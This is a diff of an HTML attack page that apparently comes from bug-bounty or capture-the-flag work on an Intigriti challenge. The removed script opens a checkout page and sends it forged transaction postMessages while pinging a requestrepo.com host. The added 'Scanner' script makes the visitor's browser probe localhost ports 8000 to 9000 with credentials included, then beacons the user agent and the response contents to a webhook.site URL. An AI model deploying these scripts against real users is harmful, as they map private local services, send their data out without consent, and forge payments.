@@ -1,3 +1,57 @@
-<html> <body> 
-<script> const win = window.open ( " https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=45000 " , "_blank" ) ; const payload = { type : "submitTransaction" , transaction: { toAddress: "1e0a26e7854fbcc1bf60b86fb2ce47d4dc", currency: "1337COIN", amount: 11 } } ; setInterval (
-     ( ) = > { if ( win ) { console.log         (     " Đang gửi payload ... " ) ; win.postMessage ( payload , "             * " ) ; fetch ( ' https://redddd.requestrepo.com/?status=ssss ' );         }     }, 1000 ); //document.writeln(win); </script> </body> </html>​​​​​​        
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Scanner</title>
+</head>
+<body>
+    <script>
+        const WEBHOOK_URL = "https://webhook.site/your-webhook-url";
+
+        navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({ status: "started", userAgent: navigator.userAgent }));
+
+        async function scan() {
+            const startPort = 8000;
+            const endPort = 9000;
+            const batchSize = 200;
+
+            for (let i = startPort; i <= endPort; i += batchSize) {
+                const tasks = [];
+                for (let port = i; port < i + batchSize && port <= endPort; port++) {
+                    tasks.push(checkPort(port));
+                }
+                
+                await Promise.all(tasks);
+            }
+            
+            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({ status: "finished" }));
+        }
+
+        async function checkPort(port) {
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 1500);
+
+            try {
+                const response = await fetch(`http://localhost:${port}`, {
+                    mode: 'cors',
+                    credentials: 'include',
+                    signal: controller.signal
+                });
+
+                const data = await response.text();
+
+                navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
+                    found: true,
+                    port: port,
+                    content: data.substring(0, 500)
+                }));
+
+            } catch (err) {
+
+            } finally {
+                clearTimeout(timeout);
+            }
+        }
+        scan();
+    </script>
+</body>
+</html>
